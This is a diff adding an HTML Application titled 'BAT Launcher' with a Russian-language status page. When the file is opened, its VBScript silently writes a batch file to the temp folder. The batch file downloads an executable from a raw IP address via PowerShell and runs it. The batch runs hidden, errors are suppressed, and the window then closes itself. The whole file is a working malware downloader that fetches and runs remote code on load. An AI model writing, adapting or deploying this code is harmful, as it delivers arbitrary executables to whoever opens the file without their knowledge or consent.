@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BAT Launcher</title>
+
+    <HTA:APPLICATION
+        ID="BatLauncher"
+        APPLICATIONNAME="BAT Launcher"
+        BORDER="thin"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no">
+
+    <meta charset="utf-8">
+</head>
+
+<body style="font-family: Arial; padding: 20px; background: #f5f5f5;">
+    <h2>Создание и запуск BAT файла</h2>
+
+    <div id="status" style="margin-top:20px; color:#333;">
+        Подготовка...
+    </div>
+
+<script language="VBScript">
+
+Sub Window_OnLoad
+    window.setTimeout "CreateAndRunBat", 300, "VBScript"
+End Sub
+
+Sub CreateAndRunBat
+
+    On Error Resume Next
+
+    Dim fso
+    Dim shell
+    Dim tempFolder
+    Dim batPath
+    Dim batFile
+    Dim batContent
+
+    Set fso   = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+
+    tempFolder = fso.GetSpecialFolder(2)
+    batPath = tempFolder & "\download_run.bat"
+
+    document.getElementById("status").innerHTML = _
+        "Создание BAT файла..."
+
+    batContent = _
+        "@echo off" & vbCrLf & _
+        "setlocal" & vbCrLf & _
+        "set ""URL=http://193.233.112.194:8000/hello.exe""" & vbCrLf & _
+        "set ""FILE=%TEMP%\hello.exe""" & vbCrLf & _
+        "echo Downloading..." & vbCrLf & _
+        "powershell -Command ""try { Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' } catch { exit 1 }""" & vbCrLf & _
+        "if errorlevel 1 exit /b" & vbCrLf & _
+        "start """" ""%FILE%""" & vbCrLf & _
+        "exit"
+
+    Set batFile = fso.CreateTextFile(batPath, True)
+    batFile.Write batContent
+    batFile.Close
+
+    If Err.Number <> 0 Then
+        document.getElementById("status").innerHTML = _
+            "Ошибка создания BAT: " & Err.Description
+        Exit Sub
+    End If
+
+    document.getElementById("status").innerHTML = _
+        "BAT создан:<br>" & batPath & "<br><br>Запуск..."
+
+    shell.Run """" & batPath & """", 0, False
+
+    window.setTimeout "window.close()", 2000, "VBScript"
+
+End Sub
+
+</script>
+
+</body>
+</html>
